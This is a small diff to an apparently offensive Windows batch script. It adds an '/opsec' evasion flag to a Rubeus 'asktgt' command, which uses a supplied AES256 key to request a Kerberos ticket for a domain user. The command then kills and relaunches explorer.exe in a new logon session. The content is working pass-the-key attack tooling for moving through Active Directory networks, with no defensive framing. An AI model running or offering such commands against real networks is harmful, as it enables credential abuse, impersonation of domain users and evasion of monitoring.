@@ -28,7 +28,7 @@ IF defined rc4 (
 set /p aes256= "AES256:   "
 :aes256
 IF defined aes256 (
-  taskkill.exe /F /IM explorer.exe & Rubeus.exe asktgt /domain:%domain% /user:%user% /aes256:%aes256% /createnetonly:"C:\Windows\explorer.exe /NoUACCheck" /show
+  taskkill.exe /F /IM explorer.exe & Rubeus.exe asktgt /domain:%domain% /user:%user% /aes256:%aes256% /opsec /createnetonly:"C:\Windows\explorer.exe /NoUACCheck" /show
   goto commonexit
 )
 
